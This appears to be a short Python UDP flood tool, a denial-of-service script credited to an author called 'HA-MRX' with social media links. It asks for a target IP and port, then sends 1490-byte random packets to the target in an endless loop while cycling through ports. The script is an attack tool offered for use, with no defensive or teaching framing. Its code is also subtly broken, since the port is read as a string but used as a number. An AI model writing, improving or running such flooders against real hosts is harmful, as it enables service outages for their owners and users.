import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("cls")
print()
print ("Author   : HA-MRX")
print ("You Tube : https://www.youtube.com/c/HA-MRX")
print ("github   : https://github.com/Ha3MrX")
print ("Facebook : https://www.facebook.com/muhamad.jabar222")
print()
ip = input("IP Target : ")
port = input("Port       : ")
os.system("cls")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     if port == 65534:
       port = 1

